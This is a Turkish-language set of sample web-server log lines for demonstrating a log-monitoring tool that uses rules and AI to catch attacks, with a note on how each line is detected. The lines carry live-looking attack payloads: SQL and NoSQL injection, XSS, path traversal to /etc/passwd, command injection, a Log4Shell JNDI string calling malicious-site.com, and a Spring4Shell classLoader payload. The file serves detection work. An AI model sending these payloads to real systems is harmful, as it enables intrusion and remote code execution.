LOG GÖZCÜSÜ - SUNUM İÇİN ÖRNEK LOG SENARYOLARI

Aşağıdaki log kayıtları, projenin farklı yeteneklerini (Kural tabanlı tespit, AI analizi, Öğrenme mekanizması) göstermek için hazırlanmıştır. Bu satırları `access.log` dosyasına ekleyerek demolarınızı gerçekleştirebilirsiniz.

================================================================================
KATEGORİ 1: KURAL TABANLI TESPİT (Rule-Based Detection)
(Bu loglar `rules.json` içindeki mevcut Regex kurallarıyla anında yakalanır.)
================================================================================

1. SQL Injection (Basit Tautology):
192.168.1.10 - - [31/Dec/2025:10:00:00 +0300] "GET /products.php?id=1' OR 1=1 HTTP/1.1" 200 4522 "-" "Mozilla/5.0"
-> Ajan, "OR 1=1" kalıbını gördüğü an "SQL Injection" alarmı verir.

2. XSS (Cross Site Scripting):
192.168.1.11 - - [31/Dec/2025:10:05:00 +0300] "GET /search?q=<script>alert('im_here')</script> HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
-> Ajan, "<script>" etiketini yakalar.

3. Path Traversal (Dosya Okuma):
192.168.1.12 - - [31/Dec/2025:10:10:00 +0300] "GET /download?file=../../etc/passwd HTTP/1.1" 200 2048 "-" "curl/7.68.0"
-> Ajan, "/etc/passwd" ve "../" kalıbını tespit edip engeller.

4. Command Injection (Komut Çalıştırma):
192.168.1.13 - - [31/Dec/2025:10:15:00 +0300] "POST /api/ping HTTP/1.1" 200 500 "-" "Mozilla/5.0" "ip=1.1.1.1&cmd=whoami"
-> Ajan, "cmd=" parametresini şüpheli bulur.

================================================================================
KATEGORİ 2: AI DESTEKLİ ANALİZ (AI Detection)
(Bu loglar kuralları atlatabilir (bypass) veya Regex ile yakalanması zordur. AI devreye girer.)
================================================================================

5. Obfuscated SQL Injection (Yorum satırlarıyla gizlenmiş):
192.168.1.20 - - [31/Dec/2025:11:00:00 +0300] "GET /user?id=1%27%20/*!50000UNION*/%20/*!50000SELECT*/%20user,pass%20-- HTTP/1.1" 200 3000 "-" "Mozilla/5.0"
-> Standart "UNION SELECT" regex boşluk bekler. Burada yorum satırları (/*!...*/) kullanıldığı için regex kaçırabilir ama AI bunu kesinlikle bir saldırı olarak tanımlar.

6. NoSQL Injection (JSON tabanlı):
192.168.1.21 - - [31/Dec/2025:11:05:00 +0300] "POST /login HTTP/1.1" 401 150 "-" "Mozilla/5.0" "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}"
-> Regexler genellikle SQL komutlarını arar. Bu bir MongoDB saldırısıdır. AI, JSON payload'ındaki "$ne" (not equal) operatörünü fark eder.

7. Logic Attack (İş Mantığı Manipülasyonu - Negatif Fiyat):
192.168.1.22 - - [31/Dec/2025:11:10:00 +0300] "POST /cart/add HTTP/1.1" 200 50 "-" "Mozilla/5.0" "item_id=55&price=-9999&qty=1"
-> Teknik olarak bir kod enjeksiyonu yoktur, regex çalışmaz. Ancak AI, "price=-9999" verisinin bir anormallik/saldırı girişimi olduğunu anlar.

================================================================================
KATEGORİ 3: ÖĞRENME MODU & YENİ KURAL (Self-Learning)
(Sistemde hiç tanımlı olmayan, yeni nesil bir saldırı. AI analiz edip yeni kural önerir.)
================================================================================

8. Log4Shell (JNDI Exploit - Yeni Tehdit Simülasyonu):
192.168.1.30 - - [31/Dec/2025:12:00:00 +0300] "GET / HTTP/1.1" 200 1024 "-" "${jndi:ldap://malicious-site.com/exploit}"
-> Bu log, User-Agent başlığında meşhur Log4j açığını kullanıyor. Kurallarımızda yoksa bile AI bunu "Remote Code Execution" olarak işaretler ve "jndi:ldap" içeren yeni bir regex önerir.

9. Spring4Shell (Class Loader Manipulation):
192.168.1.31 - - [31/Dec/2025:12:05:00 +0300] "POST /app HTTP/1.1" 500 0 "-" "python-requests/2.25.1" "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di"
-> Çok spesifik bir Java framework saldırısı. AI, "class.module.classLoader" zincirini tehlikeli bulur.
